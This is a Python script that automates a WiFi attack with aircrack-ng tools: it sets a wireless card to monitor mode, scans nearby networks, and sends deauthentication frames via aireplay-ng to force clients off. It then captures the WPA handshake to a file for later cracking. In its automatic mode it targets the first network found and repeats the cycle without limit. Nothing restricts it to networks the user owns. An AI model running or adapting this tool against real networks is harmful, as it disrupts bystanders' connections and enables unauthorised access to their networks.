# importing libraries 
import subprocess
from subprocess import Popen, PIPE, CalledProcessError

# import system libraries
import os 
import sys
import time
import datetime
import requests
import signal
import re

#import colors
from termcolor import colored

# ! IMPORTANT !
# Aircrack-ng needs to be installed on system for this to work.
# Also, a second WiFi card needs to be available.

#check available wifi interfaces
def iwconfig():
    cmd = "iwconfig"
    returned_output = subprocess.check_output(cmd)

    out = returned_output.decode("utf-8")
    splitted = out.split()

    for i in splitted:
        if "Mode:Monitor" in i:
            index = splitted.index(i)
            name_connection = splitted[index-3]
            
            return name_connection, True
        else:
            if "ESSID:off/any" in i:
                index = splitted.index(i)
                name_connection = splitted[index-3]
            
                return name_connection, False

#set selected interface to monitor mode
def airmon_ng(name_connection, monitor_mode):
    if monitor_mode == True:
        print("\n" + name_connection + " is already on monitor mode.")
        return name_connection
    else:
        cmd = "sudo airmon-ng start " + name_connection# + " -c 1"
        returned_output = subprocess.check_output(cmd, shell=True)
        
        out = returned_output.decode("utf-8")
        splitted = out.split()
        
        for i in splitted:
            if "enabled" in i:
                index = splitted.index(i)
                connection = splitted[index+2]
              
                print(connection + " is now on monitor mode. (" + name_connection + ")")
                splitted_str = connection.split(']')
                interface_mon = splitted_str[-1]
                return interface_mon

#monitoring of networks
def airodump_ng(name_connection_mon, timeout):
    cmd = ["airodump-ng", name_connection_mon]

    table = ''
    stdout = []
    table_start = re.compile('\sCH')
    start_time = time.time()
    
    print("\n[ 1 ] Starting WIFI SCANNING for " + str(timeout) + " seconds.")

    airodump_lines=[]
    airodump = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
    while time.time() < start_time + timeout:
        line = airodump.stdout.readline()
        if table_start.match(line):
            airodump_lines = stdout.copy() #table = ''.join(stdout)
            stdout = []
        stdout.append(line)
    airodump.terminate()

    bssid_1_network = airodump_lines[5][1:18]
    bssid_2_network = airodump_lines[6][1:18]
    bssid_3_network = airodump_lines[7][1:18]
    
    network_1_name = airodump_lines[5][74:106].rstrip()
    network_2_name = airodump_lines[6][74:106].rstrip()
    network_3_name = airodump_lines[7][74:106].rstrip()

    network_1_channel = airodump_lines[5][49:51].replace(" ", "")
    network_2_channel = airodump_lines[6][49:51].replace(" ", "")
    network_3_channel = airodump_lines[7][49:51].replace(" ", "")

    print("Networks:\n[1] " + bssid_1_network + " (" + network_1_name +")\n[2] " + bssid_2_network + " (" + network_2_name +")\n[3] " + bssid_3_network + " (" + network_3_name +")\n")
    invalid_input = True
    if sys.argv[4] == "t":
        network_bssid = bssid_1_network
        network_name = network_1_name
        network_channel = network_1_channel
        print("(Auto) Selected Network: " + network_bssid + " (" + network_name + ").")
        return network_bssid, network_name, network_channel 
    else:
        while invalid_input == True:
            number = str(input("Choose network (number): "))
      
            if number == "1":
                network_bssid = bssid_1_network
                network_name = network_1_name
                network_channel = network_1_channel
                invalid_input = False
            elif number == "2":
                network_bssid = bssid_2_network
                network_name = network_2_name
                network_channel = network_2_channel
                invalid_input = False
            elif number == "3":
                network_bssid = bssid_3_network
                network_name = network_3_name
                network_channel = network_3_channel
                invalid_input = False
            else:
                print(colored("(Err)", "yellow") + " Invalid Input.")

            if invalid_input == False:
                print("Selected Network: " + network_bssid + " (" + network_name + ").")
                return network_bssid, network_name, network_channel

#returns first client bssid and more network stats
def airodump_ng_clients(network_bssid, network_name, timeout, interface):
    cmd = ["airodump-ng", "--bssid", network_bssid, interface]

    table = ''
    stdout = []
    table_start = re.compile('\sCH')
    start_time = time.time()
    
    print("\n[ 2 ] Starting CLIENTS PRE-SCANING for " + str(timeout) + " seconds on network " + str(network_bssid) + ".")

    airodump = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
    while time.time() < start_time + timeout:
        line = airodump.stdout.readline()
        if table_start.match(line):
            table = ''.join(stdout)
            stdout = []
        stdout.append(line)
    airodump.terminate() 
    
    split_t = table.split()
    for i in split_t:
        if "Probe" in i:
            index = split_t.index(i)
            try:
                bssid_first_client = split_t[index+2]
            except:
                bssid_first_client = "None"
                #sys.argv[3] = "f"
            
            if bssid_first_client == "None":
                print(colored("(Err)", "yellow") + " No clients detected. Trying to broadcast DeAuth.")
            else:
                print("First connected client: " + bssid_first_client + ".")

    return bssid_first_client

#monitoring of network, waiting for handshake
def airodump_ng_deauth_handshake(network_name, network_bssid, channel, timeout, interface, client):
    now_time = str(datetime.datetime.now())
    now_time_new = now_time.replace(" ", ".")
    network_name_new = network_name.replace(" ", "")
    filename = "captures/" + now_time_new + ":" + network_name_new

    cmd = ["airodump-ng", "-c", channel, "--bssid", network_bssid, "-w", filename, interface]
    table = ''
    stdout = []
    table_start = re.compile('\sCH')
    start_time = time.time()
    
    print("\n[ 3 ] Starting HANDSHAKE SCANNING for " + str(timeout) + " seconds on network " + network_name + ".")
        
    #Deathentication of clients from network to force a handshake.
    if sys.argv[3] == "t":
        cmd_stop = "airmon-ng stop " + interface
        subprocess.check_output(cmd_stop, shell=True)

        cmd_iw = "iwconfig"
        returned_output = subprocess.check_output(cmd_iw, shell=True)
        out = returned_output.decode("utf-8")
        splitted = out.split()

        for i in splitted:
            if "ESSID:off/any" in i:
                index = splitted.index(i)
                old_name_interface = splitted[index-3]
        
        cmd_start = "airmon-ng start " + old_name_interface + " " + channel
        subprocess.check_output(cmd_start, shell=True)
        
        try:
            returned_output_aireplay = subprocess.check_output("aireplay-ng -0 5 -a " + network_bssid + " " + interface, shell=True)
            out_aireplay = returned_output_aireplay.decode("utf-8")
            print(out_aireplay)
            splitted_aireplay = out_aireplay.split()
            for i in splitted_aireplay:
                if "DeAuth" in i:
                    print("Succesfully sent DeAuthentication attacks.")
        except subprocess.CalledProcessError:
            print(colored("(Err)", "yellow") + " DeAuth broadcasting error.\n")
        
    #Scanning for a 4-way Handshake after the Deauthentication.
    airodump = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
    while time.time() < start_time + timeout:
        line = airodump.stdout.readline()
        if table_start.match(line):
            table = ''.join(stdout)
            stdout = []
        stdout.append(line)
    airodump.terminate() 
    
    split_t = table.split()
    for i in split_t:
        if "handshake" in i:
            print(colored("[ 4 ] Handshake from network " + network_name + " SUCCESFULLY captured.\n", "green"))
            return True
        else:
            print(colored("[ 4 ] NO HANDSHAKE received from network " + network_name + ".\n", "red"))
            return False    

def main():
    #Argument Error
    if len(sys.argv) <= 4:
        print("ARGUMENT ERROR:\nUsage: sudo python3 main.py -t -t -d -A\n-t timeout for first wifi scan\n-t second timeout for specific wifi scan\n-d t/f deauthenticate process\n-A t/f automatic mode")
        exit(1)

    if sys.argv[4] == "t":
        while True:
            #setup
            name1, boolean1 = iwconfig()
            interface_mon = airmon_ng(name1, boolean1)
    
            #monitoring wifi networks in range
            network_bssid, network_name, network_channel = airodump_ng(interface_mon, int(sys.argv[1]))
     
            #waiting for handshake
            bssid_first_client = airodump_ng_clients(network_bssid, network_name, int(sys.argv[2]), interface_mon)
            airodump_ng_deauth_handshake(network_name, network_bssid, network_channel, int(sys.argv[2]), interface_mon, bssid_first_client)
    else:
        #setup
        name1, boolean1 = iwconfig()
        interface_mon = airmon_ng(name1, boolean1)
    
        #monitoring wifi networks in range
        network_bssid, network_name, network_channel = airodump_ng(interface_mon, int(sys.argv[1]))
     
        #waiting for handshake
        bssid_first_client = airodump_ng_clients(network_bssid, network_name, int(sys.argv[2]), interface_mon)
        airodump_ng_deauth_handshake(network_name, network_bssid, network_channel, int(sys.argv[2]), interface_mon, bssid_first_client)

if __name__ == '__main__': 
    main()
    

